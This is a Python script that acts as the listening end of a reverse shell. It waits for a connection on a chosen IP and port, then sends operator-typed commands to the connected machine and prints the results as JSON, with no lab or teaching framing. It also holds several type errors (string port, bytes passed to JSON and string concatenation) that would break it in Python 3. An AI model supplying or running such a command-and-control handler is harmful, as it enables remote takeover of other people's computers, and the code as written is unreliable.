import socket
import optparse
import json


def get_inputs():
    my_parse = optparse.OptionParser()

    my_parse.add_option("-i", "--ip", dest="ip", help="Enter Source Ip")
    my_parse.add_option("-p", "--port", dest="port", help="Port to listen on")

    return my_parse.parse_args()


class MainMate:
    (user_input, arguments) = get_inputs()

    def __init__(self, ip=user_input.ip, port=user_input.port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))

        listener.listen(0)  # 0 for no connection limit
        print("Listening..")

        (self.connection, self.ipg) = listener.accept()
        print(f"Connected to {self.ipg} on {port} \n\nListening..\n")

    def send_j(self, pack):
        package = json.dumps(pack)
        self.connection.send(package)

    def recv_j(self):
        data = ""

        while True:
            try:
                data += self.connection.recv(2048)
                return json.loads(data)
            except ValueError:
                continue

    def cmd_loop(self):
        while True:
            cmd_inp = input(f"{self.ipg}:").encode()
            self.send_j(cmd_inp)

            cmd_out = self.recv_j()
            print(cmd_out)


start = MainMate()  # Ip and port are set to CLI-inputs by default
start.cmd_loop()
